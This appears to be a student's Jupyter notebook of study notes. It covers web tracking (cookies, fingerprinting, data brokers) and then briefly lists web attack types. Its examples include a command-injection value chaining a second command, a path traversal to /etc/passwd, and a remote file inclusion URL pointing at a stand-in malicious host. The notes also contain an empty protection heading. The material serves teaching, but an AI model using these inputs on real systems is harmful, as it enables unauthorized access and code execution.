{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7a31dbac",
   "metadata": {},
   "source": [
    "- **Third-party cookies:** These are cookies set by a domain other than the one you are currently visiting. They are often used by advertisers to track your browsing across different sites.\n",
    "\n",
    "- **Supercookies:**\n",
    "  These are special tracking cookies that are harder to delete. Unlike normal cookies, they can be stored in unusual places like HTTP headers or other parts of your device, making them difficult to remove.\n",
    "\n",
    "- **Evercookies (Zombie cookies):**\n",
    "  These are even trickier. They store tracking data in many different places (like Flash storage, browser history, HTML5 storage). If you delete the cookie, the website can \"resurrect\" it using other saved data—like a zombie coming back to life.\n",
    "- **Tracking URLs**:\n",
    "Tracking URLs have extra information (parameters) in them to record details like where you clicked the link, how many times, and what you do after clicking. (Like affiliate links that track purchases.)\n",
    "**Browser Fingerprinting**: \n",
    "Websites gather lots of small details from your browser and device (like screen size, fonts installed, browser version, plugins) to create a unique \"fingerprint.\" This fingerprint can identify you without using cookies. Because these details vary from person to person, fingerprinting can uniquely identify millions of users even if cookies are blocked.\n",
    "- **Corporate Surveillance**: Companies track users extensively, monitoring their behavior, relationships, interests, and even emotional states. \n",
    "  - **Data Brokers:** \n",
    "  Companies that collect, buy, and sell massive amounts of personal data from various sources, often without your knowledge.\n",
    "- **Protection Measures Against Tracking**: \n",
    "- **Command Injection**: Website lets users run commands on the server without proper checks. (e.g., `nslookup ...; XXX`)\n",
    "- **Path Traversal**: Users manipulate file paths to access unauthorized files (e.g., `../../etc/passwd`).\n",
    "- **File Inclusion**: Users can include files from the server or remote locations, potentially executing malicious code (e.g., `index.php?name=http://badsite.com/malicious.php` instead of `http://example.com/index.php?page=about.php`)."
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
